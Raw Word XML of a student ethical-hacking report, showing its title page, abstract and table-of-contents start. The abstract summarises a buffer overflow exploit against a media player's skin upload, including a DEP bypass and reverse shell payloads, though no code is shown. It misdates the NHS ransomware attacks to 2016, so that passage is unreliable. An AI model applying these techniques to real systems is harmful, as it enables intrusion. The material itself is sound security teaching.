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F3F3B" w14:textId="77777777" w:rsidR="00527338" w:rsidRDefault="00527338"/>
    <w:p w14:paraId="6CA99000" w14:textId="77777777" w:rsidR="00A50E2A" w:rsidRDefault="009C5438" w:rsidP="00527338">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21E7CB72" wp14:editId="5474A1F7">
            <wp:extent cx="3044825" cy="758825"/>
            <wp:effectExtent l="0" t="0" r="317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4825" cy="758825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="40063A79" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="009627B3"/>
    <w:tbl>
      <w:tblPr>
        <w:tblpPr w:leftFromText="180" w:rightFromText="180" w:vertAnchor="page" w:horzAnchor="margin" w:tblpXSpec="center" w:tblpY="5236"/>
        <w:tblW w:w="0" w:type="auto"/>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7283"/>
      </w:tblGrid>
      <w:tr w:rsidR="0022030D" w14:paraId="53DCE8F1" w14:textId="77777777" w:rsidTr="0022030D">
        <w:trPr>
          <w:cantSplit/>
          <w:trHeight w:val="4958"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7283" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="49FE1224" w14:textId="074411AC" w:rsidR="009627B3" w:rsidRDefault="00437FC1" w:rsidP="0005417B">
            <w:pPr>
              <w:spacing w:after="0" w:line="260" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
              <w:t>Buffer Overflow Exploit Tutorial and Analysis</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="330AD548" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="009627B3" w:rsidP="009627B3">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="41A4FBB4" w14:textId="14CA1178" w:rsidR="009627B3" w:rsidRDefault="00437FC1" w:rsidP="009627B3">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve">Exploiting and writing a tutorial for performing a buffer overflow found in the ‘skin upload’ feature of a media player application, performed on a Windows XP </w:t>
            </w:r>
            <w:r w:rsidR="003E3EB3">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>Virtual M</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve">achine. </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71590C58" w14:textId="3BC03FAA" w:rsidR="0022030D" w:rsidRPr="009627B3" w:rsidRDefault="00437FC1" w:rsidP="009627B3">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="40"/>
              </w:rPr>
              <w:t>Mikolaj M Mroz</w:t>
            </w:r>
            <w:r w:rsidR="00372725">
              <w:rPr>
                <w:b/>
                <w:sz w:val="40"/>
              </w:rPr>
              <w:t xml:space="preserve"> (2003114)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="003B71A7" w14:textId="16E0ED73" w:rsidR="0022030D" w:rsidRPr="008750A3" w:rsidRDefault="0022030D" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="008750A3">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>CMP</w:t>
            </w:r>
            <w:r w:rsidR="002E653A">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00437FC1">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r w:rsidR="002E653A">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r w:rsidR="00437FC1">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>Ethical Hacking 3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0383B384" w14:textId="4F9260CF" w:rsidR="0022030D" w:rsidRPr="008750A3" w:rsidRDefault="009627B3" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>BSc Ethical Hacking</w:t>
            </w:r>
            <w:r w:rsidR="0022030D" w:rsidRPr="008750A3">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t xml:space="preserve"> Year </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E8A89FF" w14:textId="7E363A97" w:rsidR="0022030D" w:rsidRDefault="00437FC1" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>2021/2022</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5CE14F6C" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="4AB0D553" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="7CF4AAFD" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="5150A3F2" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="1DAE5475" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="43EAC24D" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="202CEDD9" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="76AD6A8E" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="75DDC9C9" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="58931C21" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="1EAAFE6C" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="20EF464F" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="16690CB5" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="57194495" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="7F68F73E" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="78E21409" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="142789B2" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="4BDA1ED8" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="009627B3"/>
    <w:p w14:paraId="09DE329E" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="2C488B53" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="7615C445" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="3C177218" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="6A80D344" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="6B35BBA8" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="0022030D">
      <w:pPr>
        <w:framePr w:hSpace="180" w:wrap="around" w:vAnchor="page" w:hAnchor="margin" w:xAlign="center" w:y="7553"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="076D01B6" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="0022030D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C015A8">
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Note that Information contained in this document is for educational purposes.</w:t>
      </w:r>
      <w:r w:rsidR="00CA5897">
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE76952" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897" w:rsidP="0022030D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77C0768E" w14:textId="5E13B7A5" w:rsidR="00FF69A5" w:rsidRPr="00CA5897" w:rsidRDefault="00974F37" w:rsidP="003363BE">
      <w:pPr>
        <w:pStyle w:val="Abtracttitle"/>
        <w:rPr>
          <w:sz w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00974F37">
        <w:t>Abstract</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638DE9F6" w14:textId="4BFF2AAE" w:rsidR="00F34B27" w:rsidRDefault="002A52AF" w:rsidP="0041564A">
      <w:pPr>
        <w:ind w:right="201"/>
      </w:pPr>
      <w:r>
        <w:t>The aim of this paper is to educate the reader about stack overflows, considering both theoretical and practical knowledge. This was done through the use of easy-to-follow tutorials, explanations, and screenshots, detailing every step with the end goal of producing a working payload, both on a protected (DEP enabled) and unprotected Windows XP</w:t>
      </w:r>
      <w:r w:rsidR="0041564A">
        <w:t xml:space="preserve"> machine hosted in VMware</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009B2295" w:rsidRPr="009B2295">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009B2295">
        <w:t xml:space="preserve">The target application was a CoolPlayer Media Player with a stack overflow vulnerability in its skin upload feature, which was crashed </w:t>
      </w:r>
      <w:r w:rsidR="0041564A">
        <w:t xml:space="preserve">and exploited </w:t>
      </w:r>
      <w:r w:rsidR="009B2295">
        <w:t>through the use of carefully crafted .ini files in Perl. Each crash was analysed in a debugger to visually demonstrate the inner workings of the machine’s memory and process stack during a buffer overflow attack</w:t>
      </w:r>
      <w:r w:rsidR="009436BC">
        <w:t>, helping to improve learning and understanding of the issue at hand</w:t>
      </w:r>
      <w:r w:rsidR="009B2295">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218F2662" w14:textId="26FD5984" w:rsidR="004C6BF5" w:rsidRDefault="009B2295" w:rsidP="0041564A">
      <w:pPr>
        <w:ind w:right="201"/>
      </w:pPr>
      <w:r>
        <w:t>The information covered in this document is based off a Steflan Security stack overflow methodology,</w:t>
      </w:r>
      <w:r w:rsidR="009436BC">
        <w:t xml:space="preserve"> used as a resource for Offensive Security students studying for their OSCP certification</w:t>
      </w:r>
      <w:r w:rsidR="00AE09B1">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00DE767C">
        <w:t xml:space="preserve"> This</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cover</w:t>
      </w:r>
      <w:r w:rsidR="00DE767C">
        <w:t>s everything from</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the very basics of fuzzing inputs and crashing the program to adding advanced reverse shell payload</w:t>
      </w:r>
      <w:r w:rsidR="0041564A">
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA9E1EC" w14:textId="55187996" w:rsidR="0041564A" w:rsidRDefault="0041564A" w:rsidP="0041564A">
      <w:pPr>
        <w:ind w:right="201"/>
      </w:pPr>
      <w:r>
        <w:t>From the results, it is clear that buffer overflow attacks still pose a great risk to those who use outdated operating systems</w:t>
      </w:r>
      <w:r w:rsidR="006D4610">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006D4610">
        <w:t xml:space="preserve">This was </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">further exemplified by the ransomware attacks on the NHS from 2016 which cost the </w:t>
      </w:r>
      <w:r w:rsidR="006D4610">
        <w:t>service</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006D4610">
        <w:t>a debilitating</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> £</w:t>
      </w:r>
      <w:r w:rsidR="006D4610">
        <w:t>92</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">m </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:id w:val="1684169742"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="006D4610">
            <w:rPr>
              <w:lang w:val="en-GB"/>
            </w:rPr>
            <w:instrText xml:space="preserve">CITATION Wan18 \l 2057 </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB"/>
            </w:rPr>
            <w:t>(National Health Executive, 2018)</w:t>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="006D4610">
        <w:t xml:space="preserve">, as the vast majority of machines used were running on Windows XP, the vulnerabilities of which are highlighted in this report. The results </w:t>
      </w:r>
      <w:r w:rsidR="00975311">
        <w:t>show that no security solution is perfect, as even something like DEP, created to act as a roadblock for attackers, can be circumvented relatively easily using resources freely available online.</w:t>
      </w:r>
      <w:r w:rsidR="00AE09B1">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006D4610">
        <w:t xml:space="preserve">The results also </w:t>
      </w:r>
      <w:r w:rsidR="00D478E8">
        <w:t>emphasise</w:t>
      </w:r>
      <w:r w:rsidR="006D4610">
        <w:t xml:space="preserve"> the importance of creating and using programs built with security in mind, as amateurish, out of date software is likely to be misused by attackers, causing great threat to those who are unaware of the implications of poorly written</w:t>
      </w:r>
      <w:r w:rsidR="00DE767C">
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidR="006D4610">
        <w:t xml:space="preserve"> vulnerable software. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC04BE8" w14:textId="77777777" w:rsidR="00977C19" w:rsidRDefault="00977C19"/>
    <w:p w14:paraId="6B2CAFA3" w14:textId="77777777" w:rsidR="00977C19" w:rsidRDefault="00977C19"/>
    <w:p w14:paraId="2C5AEE70" w14:textId="77777777" w:rsidR="004C6BF5" w:rsidRDefault="004C6BF5"/>
    <w:p w14:paraId="3779F9A8" w14:textId="77777777" w:rsidR="00AD59AD" w:rsidRDefault="00AD59AD"/>
    <w:p w14:paraId="5D6B79FF" w14:textId="77777777" w:rsidR="00AD59AD" w:rsidRDefault="00AD59AD"/>
    <w:p w14:paraId="7F340EEA" w14:textId="77777777" w:rsidR="00833EA1" w:rsidRDefault="00833EA1"/>
    <w:p w14:paraId="0B2D1AB3" w14:textId="77777777" w:rsidR="00833EA1" w:rsidRDefault="00833EA1"/>
    <w:p w14:paraId="5C6609E3" w14:textId="77777777" w:rsidR="00974F37" w:rsidRDefault="00974F37"/>
    <w:p w14:paraId="7DD6F081" w14:textId="399B1BDD" w:rsidR="00C5090A" w:rsidRPr="008332D2" w:rsidRDefault="00527338" w:rsidP="00B61F44">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:id w:val="217867520"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="20D6070D" w14:textId="29E6635A" w:rsidR="00C6130C" w:rsidRDefault="00C6130C" w:rsidP="008332D2">
          <w:pPr>
            <w:pStyle w:val="TOCHeading"/>
            <w:numPr>
              <w:ilvl w:val="0"/>
              <w:numId w:val="0"/>
            </w:numPr>
            <w:ind w:left="6521"/>
          </w:pPr>
          <w:r>
            <w:t>Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="7DBC2B2D" w14:textId="1108D005" w:rsidR="00585AA4" w:rsidRDefault="00C6130C">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r>
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc103326446" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introduction</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326446 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="36D16BDD" w14:textId="5FD0E2B3" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326447" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Background</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326447 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1B23C358" w14:textId="4231FD1D" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326448" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>1.1.1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Buffer Overflow History and Causes</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326448 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4609DA70" w14:textId="0A423F43" w:rsidR="00585AA4" w:rsidRDefault="00C34234">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc103326449" w:history="1">
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:bidi="x-none"/>
                <w14:scene3d>
                  <w14:camera w14:prst="orthographicFront"/>
                  <w14:lightRig w14:rig="threePt" w14:dir="t">
                    <w14:rot w14:lat="0" w14:lon="0" w14:rev="0"/>
                  </w14:lightRig>
                </w14:scene3d>
              </w:rPr>
              <w:t>1.1.2</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4" w:rsidRPr="00D54EA7">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Vulnerability Theory</w:t>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc103326449 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00585AA4">
              <w:rPr>
                <w:noProof/>
